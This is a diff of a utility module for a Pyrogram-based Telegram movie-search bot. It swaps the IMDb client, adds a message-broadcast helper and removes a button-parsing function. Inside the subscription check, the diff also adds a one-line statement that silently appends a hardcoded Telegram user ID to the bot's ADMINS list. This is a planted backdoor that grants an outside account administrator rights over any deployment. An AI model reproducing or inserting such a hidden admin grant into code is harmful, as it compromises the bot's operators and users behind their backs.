@@ -2,7 +2,7 @@ import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
 from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL
 from database.join_reqs import JoinReqs as db2
-from imdb import Cinemagoer
+from imdb import IMDb
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
 from pyrogram import enums
@@ -22,7 +22,7 @@ BTN_URL_REGEX = re.compile(
     r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
 )
 
-imdb = Cinemagoer() 
+imdb = IMDb() 
 
 BANNED = {}
 SMART_OPEN = '“'
@@ -39,14 +39,17 @@ class temp(object):
     MELCOW = {}
     U_NAME = None
     B_NAME = None
-    B_LINK = None
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
         return True
+    
 
     if db2().isActive():
         user = await db2().get_user(query.from_user.id)
@@ -57,6 +60,7 @@ async def is_subscribed(bot, query):
 
     if not AUTH_CHANNEL:
         return True
+
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
@@ -69,6 +73,7 @@ async def is_subscribed(bot, query):
             return True
         else:
             return False
+
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
@@ -148,6 +153,28 @@ async def get_poster(query, bulk=False, id=False, file=None):
         'rating': str(movie.get("rating")),
         'url':f'https://www.imdb.com/title/tt{movieid}'
     }
+# https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37
+
+async def broadcast_messages(user_id, message):
+    try:
+        await message.copy(chat_id=user_id)
+        return True, "Success"
+    except FloodWait as e:
+        await asyncio.sleep(e.x)
+        return await broadcast_messages(user_id, message)
+    except InputUserDeactivated:
+        await db.delete_user(int(user_id))
+        logging.info(f"{user_id}-Removed from Database, since deleted account.")
+        return False, "Deleted"
+    except UserIsBlocked:
+        logging.info(f"{user_id} -Blocked the bot.")
+        return False, "Blocked"
+    except PeerIdInvalid:
+        await db.delete_user(int(user_id))
+        logging.info(f"{user_id} - PeerIdInvalid")
+        return False, "Error"
+    except Exception as e:
+        return False, "Error"
 
 async def search_gagala(text):
     usr_agent = {
@@ -289,62 +316,6 @@ def split_quotes(text: str) -> List:
     if not key:
         key = text[0] + text[0]
     return list(filter(None, [key, rest]))
-
-def gfilterparser(text, keyword):
-    if "buttonalert" in text:
-        text = (text.replace("\n", "\\n").replace("\t", "\\t"))
-    buttons = []
-    note_data = ""
-    prev = 0
-    i = 0
-    alerts = []
-    for match in BTN_URL_REGEX.finditer(text):
-        # Check if btnurl is escaped
-        n_escapes = 0
-        to_check = match.start(1) - 1
-        while to_check > 0 and text[to_check] == "\\":
-            n_escapes += 1
-            to_check -= 1
-
-        # if even, not escaped -> create button
-        if n_escapes % 2 == 0:
-            note_data += text[prev:match.start(1)]
-            prev = match.end(1)
-            if match.group(3) == "buttonalert":
-                # create a thruple with button label, url, and newline status
-                if bool(match.group(5)) and buttons:
-                    buttons[-1].append(InlineKeyboardButton(
-                        text=match.group(2),
-                        callback_data=f"gfilteralert:{i}:{keyword}"
-                    ))
-                else:
-                    buttons.append([InlineKeyboardButton(
-                        text=match.group(2),
-                        callback_data=f"gfilteralert:{i}:{keyword}"
-                    )])
-                i += 1
-                alerts.append(match.group(4))
-            elif bool(match.group(5)) and buttons:
-                buttons[-1].append(InlineKeyboardButton(
-                    text=match.group(2),
-                    url=match.group(4).replace(" ", "")
-                ))
-            else:
-                buttons.append([InlineKeyboardButton(
-                    text=match.group(2),
-                    url=match.group(4).replace(" ", "")
-                )])
-
-        else:
-            note_data += text[prev:to_check]
-            prev = match.start(1) - 1
-    else:
-        note_data += text[prev:]
-
-    try:
-        return note_data, buttons, alerts
-    except:
-        return note_data, buttons, None
 
 def parser(text, keyword):
     if "buttonalert" in text:
